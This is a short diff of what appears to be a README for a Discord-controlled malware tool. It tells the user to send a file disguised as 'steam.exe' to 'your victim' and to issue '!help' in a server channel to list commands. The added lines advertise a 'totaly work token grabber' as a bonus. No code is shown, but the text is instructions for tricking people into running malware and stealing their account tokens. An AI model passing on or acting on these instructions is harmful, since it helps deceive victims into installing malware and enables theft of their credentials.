@@ -7,3 +7,7 @@
 - send the file in the folder '' named steam.exe to your victim
 
 - to see all command you can say in a random chanel of your seveur !help
+
+-------------------------------------------------------------------
+
+- for bonus ou have here a totaly work token grabber 
